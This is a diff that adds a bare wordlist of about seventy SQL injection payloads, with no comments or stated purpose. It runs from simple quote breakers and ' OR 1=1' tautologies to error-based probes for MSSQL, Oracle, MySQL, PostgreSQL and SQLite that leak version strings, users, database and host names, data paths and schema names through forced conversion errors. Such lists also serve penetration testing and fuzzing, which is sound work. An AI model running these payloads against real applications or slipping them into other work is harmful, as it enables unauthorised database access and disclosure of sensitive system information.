@@ -1,0 +1,70 @@
+'
+"
+')
+")
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1 AND 1=CONVERT(int,@@version)--
+' OR 1=1 AND 1=CAST((SELECT @@version) AS int)--
+' OR 1=1 AND 1=to_number('text')--
+' OR 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH('x')--
+' OR 1=1 AND 1=utl_inaddr.get_host_name('192.0.2.1')--
+' OR 1=1 AND 1=xmltype('<x/>')--
+' OR 1=1 AND 1=extractvalue(1,concat(0x7e,version()))--
+' OR 1=1 AND 1=updatexml(1,concat(0x7e,version()),1)--
+' OR 1=1 AND 1=extractvalue(1,concat(0x7e,user()))--
+' OR 1=1 AND 1=extractvalue(1,concat(0x7e,database()))--
+' OR 1=1 AND 1=(SELECT 1/0)--
+' OR 1=1 AND 1=1/(SELECT 0)--
+' OR 1=1 AND 1=0/0--
+' OR 1=1 AND 1=cast('x' as int)--
+' OR 1=1 AND 1=cast('x' as signed)--
+' OR 1=1 AND 1=convert(int,'x')--
+' OR 1=1 AND 1=CONVERT(int,(SELECT @@version))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT CHAR(65)))--
+' OR 1=1 AND 1=convert(int,@@servername)--
+' OR 1=1 AND 1=cast((SELECT @@version) as int)--
+' OR 1=1 AND 1=to_number((SELECT banner FROM v$version WHERE rownum=1))--
+' OR 1=1 AND 1=to_number((SELECT version FROM v$instance))--
+' OR 1=1 AND 1=to_number('x')--
+' OR 1=1 AND 1=CAST((SELECT user) AS int)--
+' OR 1=1 AND 1=convert(int,user)--
+' OR 1=1 AND 1=CONVERT(int,(SELECT db_name()))--
+' OR 1=1 AND 1=extractvalue(1,concat(0x7e,version(),0x7e))--
+' OR 1=1 AND 1=updatexml(1,concat(0x7e,version(),0x7e),1)--
+' OR 1=1 AND 1=cast((SELECT current_database()) as int)--
+' OR 1=1 AND 1=cast((SELECT current_user) as int)--
+' OR 1=1 AND 1=cast((SELECT name FROM sqlite_master LIMIT 1) as int)--
+' OR 1=1 AND 1=(SELECT 1/zero)--
+' OR 1=1 AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) as int)--
+' OR 1=1 AND 1=CAST((SELECT current_setting('server_version')) AS int)--
+' OR 1=1 AND 1=CAST((SELECT inet_server_addr()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT pg_backend_pid()) AS int)--
+' OR 1=1 AND 1=to_number((SELECT username FROM all_users WHERE rownum=1))--
+' OR 1=1 AND 1=to_number((SELECT host_name FROM v$instance))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT @@servername))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT SYSTEM_USER))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT DB_NAME()))--
+' OR 1=1 AND 1=CAST((SELECT @@version) AS unsigned)--
+' OR 1=1 AND 1=CAST((SELECT version()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT user()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT database()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT table_schema FROM information_schema.tables LIMIT 1) AS int)--
+' OR 1=1 AND 1=CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS int)--
+' OR 1=1 AND 1=CAST((SELECT schema_name FROM information_schema.schemata LIMIT 1) AS int)--
+' OR 1=1 AND 1=CONVERT(int,(SELECT @@spid))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT HOST_NAME()))--
+' OR 1=1 AND 1=to_number((SELECT global_name FROM global_name))--
+' OR 1=1 AND 1=to_number((SELECT sys_context('USERENV','CURRENT_USER') FROM dual))--
+' OR 1=1 AND 1=CAST((SELECT sqlite_version()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT current_user) AS int)--
+' OR 1=1 AND 1=CAST((SELECT current_database()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT pg_catalog.version()) AS int)--
+' OR 1=1 AND 1=CAST((SELECT current_setting('search_path')) AS int)--
+' OR 1=1 AND 1=CAST((SELECT user) AS int)--
+' OR 1=1 AND 1=CAST((SELECT @@hostname) AS int)--
+' OR 1=1 AND 1=CAST((SELECT @@datadir) AS int)--
+' OR 1=1 AND 1=to_number((SELECT banner FROM v$version WHERE rownum=1))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT @@servicename))--
+' OR 1=1 AND 1=CONVERT(int,(SELECT @@language))--
